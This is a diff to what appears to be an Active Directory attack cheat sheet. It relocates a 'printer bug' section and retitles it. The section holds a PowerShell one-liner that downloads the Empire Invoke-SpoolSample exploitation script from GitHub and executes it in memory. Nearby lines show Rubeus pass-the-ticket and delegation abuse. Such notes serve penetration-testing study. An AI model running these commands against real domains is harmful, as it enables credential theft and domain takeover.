@@ -685,6 +685,13 @@ klist
 ```
 * * *
 
+# Printer bug - why wait when you can spool?
+https://github.com/leechristensen/SpoolSample
+
+```iex (new-object Net.WebClient).DownloadString("https://raw.githubusercontent.com/BC-SECURITY/Empire/main/empire/server/data/module_source/exploitation/Invoke-SpoolSample.ps1")```
+
+* * * 
+
 # Constrained Delegation
 This is when a TGT can be forwarded only to a specified Service defined in the specific User/Machine/Resource msds-allowedtodelegateto property.
 It also introduces s4u - which allows a Service to request a TGS for itself on behalf of a user who may or may not be authenticating via Kerberos.
@@ -755,10 +762,6 @@ OR
 ``` Rubeus.exe ptt /ticket:C:\Windows\System32\TGS_<snip>_.kirbi ```
 
 
-# Why wait when you can spool?
-https://github.com/leechristensen/SpoolSample
-
-```iex (new-object Net.WebClient).DownloadString("https://raw.githubusercontent.com/BC-SECURITY/Empire/main/empire/server/data/module_source/exploitation/Invoke-SpoolSample.ps1")```
 
 # DNS Admins
 https://medium.com/@esnesenon/feature-not-bug-dnsadmin-to-dc-compromise-in-one-line-a0f779b8dc83
